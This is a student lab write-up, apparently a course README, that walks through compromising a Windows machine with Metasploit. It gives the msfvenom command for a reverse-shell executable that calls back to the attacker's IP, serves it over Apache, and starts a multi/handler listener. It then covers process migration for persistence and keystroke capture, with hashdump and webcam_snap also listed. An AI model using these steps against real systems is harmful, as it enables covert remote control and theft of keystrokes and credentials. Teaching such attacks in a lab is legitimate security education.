# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

### Developed By V guru Raghav Ponjeevith (212223220027)

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:


## Architecture Diagram

```bash
## 🛠️ Metasploit Exploitation Architecture (Windows Target)


+----------------+                           +------------------+
|  🟢 Attacker    |      🔁 Reverse Shell      |   🔴 Victim (Win) |
|  (Kali Linux)  | <------------------------- |  Unpatched SMB   |
|  - msfconsole  |       (TCP 4444)          |  RDP, AV Bypass  |
|  - handler     |                           |                  |
+-------+--------+                           +--------+---------+
        |                                             |
        |  ⚙️ Payload generation using msfvenom        |
        |                                             |
        v                                             v
msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload  
         LHOST=attacker_ip LPORT=4444               or exploit triggers  
         -f exe > evil.exe  

        |
        |  🧲 Listener waits (multi/handler)
        v

+------------------------------------------------------------+
|     🧠 Meterpreter Session Established (shell access)       |
+------------------------------------------------------------+
| Commands: sysinfo | hashdump | migrate | webcam_snap | etc |
+------------------------------------------------------------+

```
### PROGRAM:

Find the attackers ip address using ifconfig

<img width="763" height="317" alt="image" src="https://github.com/user-attachments/assets/be7961f0-228b-4d39-b411-7b0cf2b2e68e" />


### Output:



Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe```

copy the fun.exe into the apache ```/var/www/html ```folder

<img width="896" height="122" alt="image" src="https://github.com/user-attachments/assets/71f287b1-6f97-4401-90ee-ac5b1d89b039" />


### Output:


Start apache server ```sudo systemctl apache2 start``` 

<img width="629" height="40" alt="image" src="https://github.com/user-attachments/assets/0f567f02-8372-473b-8d3e-81d95c8853cf" />


Check the status of apache2 ```sudo apache2 status```

<img width="945" height="402" alt="image" src="https://github.com/user-attachments/assets/476dfe5d-d251-4da4-a5e4-5bf76ab90c20" />


Invoke msfconsole:

<img width="904" height="509" alt="image" src="https://github.com/user-attachments/assets/3369b1ec-fc04-45a7-a8c4-267eae4fa2a5" />


Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

<img width="878" height="337" alt="image" src="https://github.com/user-attachments/assets/5b7c2cea-9705-4c32-b7a5-5c0e99f90547" />



Starting a command and control Server
```use multi/handler```
```set PAYLOAD windows/meterpreter/reverse_tcp``` 
```set LHOST 0.0.0.0```
```exploit```

<img width="801" height="126" alt="image" src="https://github.com/user-attachments/assets/b33daa09-bf1d-4ca9-8296-562969dee685" />


### Output 


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.



Bypass any warning boxes, double-click the file, and allow it to run.
On kali give the command exploit



To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156



<img width="886" height="738" alt="image" src="https://github.com/user-attachments/assets/d0d5d104-5b6e-4bc3-bdb3-5e541e5f8233" />


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:


<img width="924" height="545" alt="image" src="https://github.com/user-attachments/assets/fdd02bda-80e9-4d54-b8b3-23e2cf05429c" />


migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

#### Post Exploitation:
The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

<img width="739" height="70" alt="image" src="https://github.com/user-attachments/assets/26e14649-9976-47f1-827b-358636dfe13c" />


keyscan_dump Shows the keystrokes captured so far

<img width="713" height="303" alt="image" src="https://github.com/user-attachments/assets/d30ea719-fd01-406e-a123-653a2dcf03b9" />


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.

